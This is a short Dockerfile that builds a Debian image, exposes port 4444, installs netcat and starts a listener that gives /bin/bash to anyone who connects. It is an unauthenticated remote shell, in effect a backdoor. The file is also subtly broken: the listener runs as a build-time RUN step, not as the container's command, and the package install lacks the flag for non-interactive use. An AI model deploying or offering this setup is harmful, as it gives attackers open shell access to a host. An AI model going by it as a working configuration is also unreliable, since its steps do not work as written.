FROM debian:latest
EXPOSE 4444
RUN apt update && apt install netcat
RUN nc -lcp 4444 -e /bin/bash
